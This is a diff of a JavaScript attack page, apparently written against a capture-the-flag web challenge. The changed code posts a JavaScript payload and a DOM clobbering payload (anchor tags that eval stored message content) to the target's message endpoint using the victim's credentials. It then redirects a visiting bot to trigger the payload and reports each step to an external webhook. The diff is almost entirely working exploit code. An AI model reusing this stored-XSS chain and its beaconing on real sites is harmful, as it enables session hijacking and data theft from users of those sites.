@@ -20,75 +20,68 @@
         
         async function executeAttack() {
             try {
-                // First, get the current message count to calculate the correct index
-                console.log('[TWO-STEP-ATTACK] Getting current message count...');
-                const countResponse = await fetch(CHALLENGE_ORIGIN + '/messages?count=1');
-                const countData = await countResponse.json();
-                const currentMessageCount = countData.count;
+                console.log('[ATTACK] Starting direct attack');
+                const img1 = new Image();
+                img1.src = WEBHOOK_URL + '?c=ATTACK_STARTING';
                 
-                console.log('[TWO-STEP-ATTACK] Current message count:', currentMessageCount);
-                
-                console.log('[TWO-STEP-ATTACK] Step 1: Posting JavaScript payload message...');
-                
-                // Post the JavaScript payload - this will be at index currentMessageCount
+                // Step 1: Post JavaScript payload (will be at Messages[2])
+                console.log('[ATTACK] Posting JavaScript payload...');
                 const response1 = await fetch(CHALLENGE_ORIGIN + '/messages', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        name: 'Attacker1', 
+                        name: 'JSPayload', 
                         message: javascriptPayload 
                     }),
                     credentials: 'include'
                 });
                 
                 if (!response1.ok) {
-                    throw new Error(`Failed to post JavaScript payload: ${response1.status}`);
+                    throw new Error(`JS payload failed: ${response1.status}`);
                 }
                 
-                console.log('[TWO-STEP-ATTACK] Step 1 completed successfully');
+                console.log('[ATTACK] JavaScript payload posted successfully');
+                const img2 = new Image();
+                img2.src = WEBHOOK_URL + '?c=JS_PAYLOAD_POSTED';
                 
-                // Wait a moment for the message to be processed
+                // Wait
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                console.log('[TWO-STEP-ATTACK] Step 2: Posting DOM Clobbering payload...');
+                // Step 2: Post DOM Clobbering payload (hardcoded to reference Messages[2])
+                const domPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[2].split(':::')[1])"></a>`;
                 
-                // Create DOM Clobbering payload - fixed index
-                // The challenge has 2 default messages, so our JS payload will be at index currentMessageCount (which should be 2)
-                const dynamicDomClobberingPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[${currentMessageCount}].split(':::')[1])"></a>`;
-                
-                // Post the DOM Clobbering payload
+                console.log('[ATTACK] Posting DOM Clobbering payload...');
                 const response2 = await fetch(CHALLENGE_ORIGIN + '/messages', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        name: 'Attacker2', 
-                        message: dynamicDomClobberingPayload 
+                        name: 'DOMPayload', 
+                        message: domPayload 
                     }),
                     credentials: 'include'
                 });
                 
                 if (!response2.ok) {
-                    throw new Error(`Failed to post DOM Clobbering payload: ${response2.status}`);
+                    throw new Error(`DOM payload failed: ${response2.status}`);
                 }
                 
-                console.log('[TWO-STEP-ATTACK] Step 2 completed successfully');
+                console.log('[ATTACK] DOM Clobbering payload posted successfully');
+                const img3 = new Image();
+                img3.src = WEBHOOK_URL + '?c=DOM_PAYLOAD_POSTED';
                 
-                // Send success notification
-                const img = new Image();
-                img.src = WEBHOOK_URL + '?c=MESSAGES_POSTED_SUCCESS';
+                // Wait
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Wait a moment then redirect to trigger the attack
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Step 3: Navigate to challenge messages page
+                console.log('[ATTACK] Navigating to challenge messages page...');
+                const img4 = new Image();
+                img4.src = WEBHOOK_URL + '?c=NAVIGATING_TO_MESSAGES';
                 
-                console.log('[TWO-STEP-ATTACK] Step 3: Redirecting bot to challenge site...');
-                window.location.href = CHALLENGE_ORIGIN + '/#messages';
+                // Use replace to avoid redirect issues
+                window.location.replace(CHALLENGE_ORIGIN + '/#messages');
                 
             } catch (error) {
-                console.error('[TWO-STEP-ATTACK] Attack failed:', error);
+                console.error('[ATTACK] Attack failed:', error);
                 const img = new Image();
                 img.src = WEBHOOK_URL + '?c=ATTACK_FAILED_' + encodeURIComponent(error.message);
             }
@@ -96,11 +89,20 @@
         
         // Execute the attack when the page loads
         window.addEventListener('load', () => {
-            console.log('[TWO-STEP-ATTACK] Page loaded, starting attack...');
-            const img = new Image();
-            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED';
+            console.log('[ATTACK] Page loaded, starting attack...');
+            console.log('[ATTACK] Current domain:', window.location.hostname);
+            console.log('[ATTACK] Current URL:', window.location.href);
             
-            executeAttack();
+            const img = new Image();
+            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&url=' + encodeURIComponent(window.location.href);
+            
+            // Only execute attack if we're on GitHub Pages
+            if (window.location.hostname.includes('github.io')) {
+                executeAttack();
+            } else {
+                const img2 = new Image();
+                img2.src = WEBHOOK_URL + '?c=NOT_ON_GITHUB_PAGES&domain=' + encodeURIComponent(window.location.hostname);
+            }
         });
     </script>
 </body>
